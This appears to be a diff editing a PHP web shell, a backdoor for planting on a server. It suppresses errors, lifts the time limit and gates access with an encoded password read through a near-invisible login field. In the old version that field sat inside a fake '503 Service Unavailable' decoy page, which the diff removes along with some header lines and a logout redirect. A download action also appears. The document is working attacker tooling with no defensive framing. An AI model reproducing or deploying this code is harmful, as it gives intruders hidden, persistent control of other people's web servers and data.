@@ -1,7 +1,5 @@
 <?php
 clearstatcache();
-header("X-Content-Type-Options: 0");
-header("X-XSS-Protection: 0");
 @ob_start();
 @session_start();
 @set_time_limit(0);
@@ -14,14 +12,7 @@ header("X-XSS-Protection: 0");
 $password = "IUAjKiFAXldTU1NTU0AmI0BAQEU=";
 function login() {
 echo "<html><head>
-<title>503 Service Unavailable</title>
-</head><body>
-<h1>Service Unavailable</h1>
-<p>The server is temporarily unable to service your
-request due to maintenance downtime or capacity
-problems. Please try again later.</p>
-<p>Additionally, a 503 Service Unavailable
-error was encountered while trying to use an ErrorDocument to handle the request.</p><pre align=right><form method=post><input type=password name=p  style='border:transparent;'/></form></pre></body></html>";
+<pre align=right><form method=post><input type=password name=p  style='border:transparent;'/></form></pre></body></html>";
 exit;
 }
 if(!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])]))
@@ -34,7 +25,6 @@ if(!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])]))
 if(isset($_GET["logout"])) {
 session_start();
 session_destroy();
-echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
 }
 if (isset($_GET['action']) && $_GET['action'] == 'download') {
     @ob_clean();
